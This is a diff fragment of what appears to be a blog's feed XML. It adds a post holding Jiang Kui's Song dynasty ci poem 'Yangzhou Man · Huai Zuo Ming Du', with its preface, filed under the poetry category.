+    <content type="html"><![CDATA[<h1 id="《扬州慢·淮左名都》-姜夔"><a href="#《扬州慢·淮左名都》-姜夔" class="headerlink" title="《扬州慢·淮左名都》- 姜夔"></a>《扬州慢·淮左名都》- 姜夔</h1><p>淳熙丙申至日，予过维扬。夜雪初霁，荠麦弥望。入其城，则四顾萧条，寒水自碧，暮色渐起，戍角悲吟。予怀怆然，感慨今昔，因自度此曲。千岩老人以为有《黍离》之悲也。</p><p>淮左名都，竹西佳处，解鞍少驻初程。过春风十里，尽荠麦青青。自胡马窥江去后，废池乔木，犹厌言兵。渐黄昏，清角吹寒，都在空城。</p><p>杜郎俊赏，算而今重到须惊。纵豆蔻词工，青楼梦好，难赋深情。二十四桥仍在，波心荡，冷月无声。念桥边红药，年年知为谁生？</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>诗</category>
       
     </categories>
     
